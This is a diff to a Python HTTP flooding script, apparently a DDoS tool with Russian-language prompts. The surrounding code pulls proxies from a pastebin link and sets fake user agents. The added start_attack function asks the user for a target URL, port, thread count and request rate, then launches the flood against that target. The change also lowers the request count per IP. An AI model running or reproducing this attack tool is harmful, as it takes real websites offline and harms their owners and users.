@@ -4,7 +4,7 @@ import time
 import random
 from fake_useragent import UserAgent
 
-req_per_ip = 600
+req_per_ip = 65
 
 def get_proxies():
     url = 'https://pastebin.com/kKiVLZs4'
@@ -76,3 +76,15 @@ def send_req(time_limit, threads, target, concurrent):
             time.sleep(1/concurrent)
 
     print('Атака завершена.')
+
+def start_attack():
+    target = input('Введите URL для атаки: ')
+    port = input('Введите порт: ')
+    threads = int(input('Введите количество потоков: '))
+    concurrent = int(input('Введите скорость атаки (количество запросов в секунду): '))
+
+    target_url = f'http://{target}:{port}'
+    print(f'Атака запущена на {target_url} в течение {time_limit} секунд с {threads} потоками и {req_per_ip} запросов на IP.')
+    send_req(time_limit, threads, target_url, concurrent)
+
+start_attack()
